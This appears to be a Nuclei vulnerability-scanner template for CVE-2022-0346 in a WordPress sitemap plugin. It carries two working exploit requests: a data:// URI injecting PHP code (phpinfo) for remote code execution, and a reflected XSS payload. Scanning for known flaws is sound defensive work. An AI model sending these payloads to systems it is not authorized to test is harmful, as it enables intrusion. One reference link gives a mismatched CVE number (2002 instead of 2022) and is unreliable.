id: CVE-2022-0346
info:
  author: Akincibor
  classification:
    cve-id: CVE-2022-0346
  description: 'The plugin does not validate a parameter which can be set to an arbitrary
    value, thus causing XSS via error message or RCE if allow_url_include is turned
    on.

    '
  metadata:
    verified: true
  name: Google XML Sitemap Generator < 2.0.4 - Reflected Cross-Site Scripting & RCE
  reference:
  - https://wpscan.com/vulnerability/4b339390-d71a-44e0-8682-51a12bd2bfe6
  - https://wordpress.org/plugins/www-xml-sitemap-generator-org/
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0346
  severity: high
  tags: xss,wp,wordpress,wp-plugin,cve,cve2022
requests:
- extractors:
  - group: 1
    part: body
    regex:
    - '>PHP Version <\/td><td class="v">([0-9.]+)'
    type: regex
  matchers:
  - condition: or
    dsl:
    - contains(body_1, 'PHP Extension') || contains(body_1, 'PHP Version')
    - contains(body_2, '<img src onerror=alert(document.domain)>') || contains(body_2,
      'Invalid Renderer type specified')
    type: dsl
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/?p=1&xsg-provider=data://text/html,%3C?php%20phpinfo();%20//&xsg-format=yyy&xsg-type=zz&xsg-page=pp'
  - '{{BaseURL}}/?p=1&xsg-provider=%3Cimg%20src%20onerror=alert(document.domain)%3E&xsg-format=yyy&xsg-type=zz&xsg-page=pp'
  req-condition: true
